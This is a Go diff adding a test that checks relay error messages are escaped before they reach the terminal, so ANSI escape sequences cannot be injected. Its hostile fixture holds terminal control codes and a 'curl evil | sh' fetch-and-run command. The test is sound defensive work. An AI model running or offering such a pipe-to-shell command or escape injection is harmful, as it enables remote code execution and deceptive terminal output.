@@ -549,3 +549,67 @@ func TestTheAnchorFetchCarriesNoIdentity(t *testing.T) {
 		}
 	}
 }
+
+// TestARelaysSentenceCannotDriveTheTerminal: every refusal a relay sends is
+// carried in HTTPError.Message and printed, through Error(), on the
+// standard error of auu and auu-admin. The relay's word for a name was made
+// printable before it was shown; the relay's word for what went wrong was
+// not, so a relay that is not honest, or one whose operator edits its
+// sentences, could put an escape sequence on every client's terminal with
+// any 4xx. Now the sentence is escaped where the error is made, on every
+// route that makes one, and a known sentence is still found in it.
+func TestARelaysSentenceCannotDriveTheTerminal(t *testing.T) {
+	esc := string(rune(0x1b))
+	hostile, err := json.Marshal(relayapi.ErrorResponse{Error: "no" + esc + "[2K" + esc + "[1;31m such thing\nrun: curl evil | sh; " + relayapi.MsgWaitingWillNotHelp})
+	if err != nil {
+		t.Fatal(err)
+	}
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		w.WriteHeader(http.StatusBadRequest)
+		w.Write(hostile)
+	}))
+	defer srv.Close()
+
+	alice, err := identity.Generate("alice")
+	if err != nil {
+		t.Fatal(err)
+	}
+	c, err := New(srv.URL, alice, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	ctx := context.Background()
+	// The three places an HTTPError is made from an answer: the plain
+	// route, the upload's append, and the blob's fetch.
+	attempts := map[string]func() error{
+		"health": func() error { return c.Health(ctx) },
+		"append": func() error {
+			_, err := c.AppendStream(ctx, strings.Repeat("a", 32), 0, strings.NewReader("x"), 1)
+			return err
+		},
+		"blob": func() error {
+			_, _, err := c.Blob(ctx, alice.Fingerprint(), 1, 0, -1)
+			return err
+		},
+	}
+	for name, attempt := range attempts {
+		err := attempt()
+		var httpErr *HTTPError
+		if !errors.As(err, &httpErr) {
+			t.Fatalf("%s: expected an HTTPError, got %v", name, err)
+		}
+		said := httpErr.Error()
+		for i := 0; i < len(said); i++ {
+			if c := said[i]; c == 0x1b || (c < 0x20 && c != '\t') {
+				t.Fatalf("%s: HTTPError.Error() carries byte %#x from the relay's sentence to the terminal; expected every byte outside the printable set escaped:\n%q", name, c, said)
+			}
+		}
+		if !strings.Contains(said, `no\x1b[2K\x1b[1;31m such thing\nrun: curl evil | sh`) {
+			t.Errorf("%s: the sentence is not shown escaped: %q", name, said)
+		}
+		if !strings.Contains(httpErr.Message, relayapi.MsgWaitingWillNotHelp) {
+			t.Errorf("%s: a known sentence is no longer found in the message: %q", name, httpErr.Message)
+		}
+	}
+}
